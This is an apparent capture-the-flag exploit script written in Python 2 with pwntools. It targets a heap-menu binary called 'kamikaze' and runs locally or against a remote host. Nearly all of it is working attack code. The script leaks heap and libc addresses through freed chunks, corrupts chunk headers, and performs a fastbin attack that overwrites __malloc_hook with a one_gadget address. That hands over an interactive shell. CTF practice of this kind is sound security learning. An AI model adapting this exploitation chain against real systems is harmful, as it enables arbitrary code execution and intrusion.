#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

local = 1
link = ''
host,port = map(str.strip, link.split(':')) if link != '' else ("",0)
context.log_level = 'debug'
#context.terminal = "/home/noone/hyperpwn/hyperpwn-client.sh"
context.terminal =  ['mate-terminal','--geometry=94x60--10-26','--hide-menubar', '-x','sh','-c',]
exe = './kamikaze'
context.binary = exe
elf = ELF(exe)
libc = elf.libc


#don't forget to change it
if local:
    io = process(exe)
else:
    io = remote(host,port)

s    = lambda data                                    : io.send(str(data))
sa   = lambda delim,data                              : io.sendafter(str(delim), str(data))
sl   = lambda data                                    : io.sendline(str(data))
sla  = lambda delim,data                              : io.sendlineafter(str(delim), str(data))
r    = lambda numb=4096                               : io.recv(numb)
rl   = lambda                                         : io.recvline().strip()
ru   = lambda delim,drop=True                         : io.recvuntil(delim, drop)
rg   = lambda regex                                   : io.recvregex(regex)
rp   = lambda timeout=1                               : io.recvrepeat(timeout)
uu32 = lambda data                                    : u32(data.ljust(4, '\x00'))
uu64 = lambda data                                    : u64(data.ljust(8, '\x00'))
lg   = lambda s,addr                                  : io.success('\033[1;31;40m%20s--> 0x%x\033[0m'%(s,addr))
ga   = lambda job=""                                  : gdb.attach(io, job) if local else 0
ia   = lambda                                         : io.interactive()

# break on aim addr
def debug(addr,PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[1], 16)
        gdb.attach(io,'b *{}'.format(hex(text_base+addr)))
    else:
        gdb.attach(io,"b *{}".format(hex(addr)))

# get_one_gadget
def get_one_gadget(filename):
    try:
        import subprocess
    except Exception as e:
        print("subprocess not install")
        exit(0)
    return map(int, subprocess.check_output(['one_gadget', '--raw', filename]).split(' '))



#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

def choice(idx):
    def wrap(f):
        def go(*args, **kargs):
            sla(">> ", idx)
            f(*args, **kargs)
        return go
    return wrap

@choice(idx=1)
def new(weight, size, stanza, hook):
    sla(": ", weight)
    sla(": ", size)
    sla(": ", stanza)
    sa(": ", hook)

@choice(idx=2)
def edit(weight, stanza):
    sla(": ", weight)
    sa(": ", stanza)

@choice(idx=3)
def kamikaze(weight, seed):
    sla(": ", weight)
    sla(": ", seed)
    
@choice(idx=4)
def delete(idx):
    sla(": ", idx)

@choice(idx=5)
def play(idx):
    sla(": ", idx)

def leak(idx):
    play(idx)
    ru("Weight: ")
    return int(rl(), 16)
def exp(host, rce=False):
    if rce:
        one_gadget = get_one_gadget(libc.path)
    
    new(1, 0x28, "chunk__1", "1"*0x10)
    new(2, 0x28, "chunk__2", "2"*0x10)
    new(3, 0x28, "chunk__3", "3"*0x10)

    delete(2) #old--2--2 chunk
    delete(3) #old--3--2 chunk
    delete(1) #old--1--2 chunk
    
    new(4, 0x48, "chunk__4", "4"*0x10) #take old 1--1 chunk
    new(5, 0x68, "chunk__5" + p64(0x11)*10, "5"*0x10) #take old 1--2 chunk
    kamikaze(5, 3) # set is_mapped
    new(6, 0x28, "chunk__6", "6"*0x10) #take old 3--2 chunk
    new(7, 0x28, "chunk__7", "7"*0x10) #take old 2--2 chunk with old pointer
    # cause loop
    delete(6)
    heap = leak(3) - 0xf0
    lg("heap", heap)
    #break the loop
    delete(5)
    want = heap + 0xc8
    struct_kami = flat(["A"*0x8, want, 0])
    new(8, 0x28, struct_kami, "8"*0x10)
    edit(0x4141414141414141, p8(0xf1))
    delete(8)
    libc.address = leak(3) - 0x3c4b78
    lg("libc", libc.address)
    #new(9, 0x8, "chunk__9", "9"*0x10)
    struct_kami = flat([ 
        p64(0)*2, 
        p64(heap+0x250), 
        p64(0)])
    fix_chunk = flat([p64(0) + p64(0x32) + p64(0)])
    ga()
    new(9, 0x48, struct_kami + fix_chunk, "9"*0x10)
    delete(9)
    new(10, 0x10, "10", "10"*0x5)
    new(11, 0x58, p64(0)*7 + p64(0x71) + p64(libc.sym['__malloc_hook']-0x23), "10"*0x5)
    new(12, 0x68, "11", "11"*0x5)
    new(13, 0x68 , "A"*0x13 + p64(libc.address + one_gadget[2]), "10"*0x5)
    sl("1")
    '''                         
    try:
        from LibcSearcher import *
    except Exception as e:
        print("LibcSearcher not install")
        exit(0)        
    obj = LibcSearcher("fgets",leak_addr)
    libc_base = leak_addr - obj.dump("fgets")  
    system_addr = libc_base + obj.dump("system")
    malloc_hook = libc_base + obj.dump("__malloc_hook")
    free_hook = libc_base + obj.dump("__free_hook")
    bin_sh_addr = libc_base + obj.dump("str_bin_sh")
    '''
    ia()

if __name__ == '__main__':
    exp(host,True)

